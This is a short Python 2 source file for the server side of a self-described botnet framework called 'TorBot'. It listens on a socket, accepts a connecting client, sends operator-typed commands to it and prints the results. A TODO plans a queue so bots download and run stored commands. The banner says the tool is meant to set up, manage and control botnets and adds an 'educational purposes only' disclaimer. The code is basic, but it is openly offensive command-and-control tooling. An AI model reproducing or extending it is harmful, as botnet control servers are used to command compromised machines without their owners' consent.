#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  Server.py
#  
#  Copyright 2015 ^Graff <>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  



'''
Pseudo-Code:
#1. Start a server starting on a port and host designated by the user.
#2. Listen for connections from incoming clients
#3. Identify clients
#4. Send Commands to clients
#5. Return result of command over the wire.


TODO:

#1. Setup a easy-to-see, at-a-glance report system.
#2. Allow for multiple connections happening simultaneously 
#3. Set Up a Queue that the user can fill with commands, so that when a client reports in, it will download and run all commands stored in queue.
#4. 


'''

import socket, sys, os, subprocess



class Server():
	'''
	This Class holds all data and methods for creating a server.
	'''
	
	DATASIZE = 1024
	
	def __init__(self):
		return 
	'''
	This creates a socket object, binds the server to a host and port, listens for connections, and returns the connection and address.
	'''	
	def StartServer(self, ipaddress,port,numConnections):
		print "[+] Creating Server Object..."
		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print "[+] Done!"
		print "[+] Starting Server on port %s" % str(port)
		server.bind((ipaddress,port))
		print "[+] Listening for connections..."
		server.listen(numConnections)
		conn,address = server.accept()
		return conn, address
	
	'''
	This takes a connection as an arguement, asks the user for a command and then sends that command to the client.
	'''
	def SendCommand(self,sock):
		command = str(raw_input("\nWhat command do you want to send: \n"))
		sock.send(command)
		return

	'''
	This method listens for data coming from the client and returns the data.
	'''
	def RecvData(self,sock):
		data = sock.recv(self.DATASIZE)
		return data
		
	'''
	This method is the basis for sending a command, and listening  back for the result.
	'''
	def ListenResponse(self,sock):
		while(True):
			try:
				self.SendCommand(sock)
				data = self.RecvData(sock)
				print "Response: %s" % str(data)
			except:
				print "An Error Occured or the response time was too long."
				self.ListenResponse(sock)

class Program():
	'''
	This Class holds data on the program itself, like banner, menu, explation, version number, etc.
	'''
	VersionNum = "v1.0"
	
	def __init__(self):
		return
		
	def Banner(self):
		print "##############"
		print "#   TorBot   #"
		print "##############"
		
	def Explanation(self):
		print "Welcome to TorBot %s\n" % self.VersionNum
		print "TorBot is a botnet framework. It's meant to help set up, manage, and control botnets."
		print "Legal Notice: This program is only meant for educational purposes only"
		print "Created by ^Craff\n"
	
	def StartOver(self):
		answer = str(raw_input("Would you like to quit?[Y/n] "))
		answer.lower()
		if answer.startswith('n'):
			os.system('cls')
			main(sys.argv)
		elif answer.startswith('y'):
			sys.exit()
	
def main(args):
	'''
	This is the main entry point into the program. It holds some of the logic as well.
	'''
	server = Server() #Create server object
	program = Program() #Create a 'program' object.
	program.Banner() #Display the Banner
	program.Explanation() #Display the program details
	
	try:
		
		connection, ipaddress = server.StartServer('127.0.0.1',8080,5) #attempt to start a server and return the connection and address associated with that connection.
		
		print "[+] %s has connected from port %s" % ipaddress
	
		server.ListenResponse(connection) #Start communicating with the client. Send commands, and listen for the result.
		
		
	except:
		print "[!] Connection was shutdown by client."
		program.StartOver()
	
	
		

	return 0 #If the program gets to here, return a zero to show that the program exited smoothly.

if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
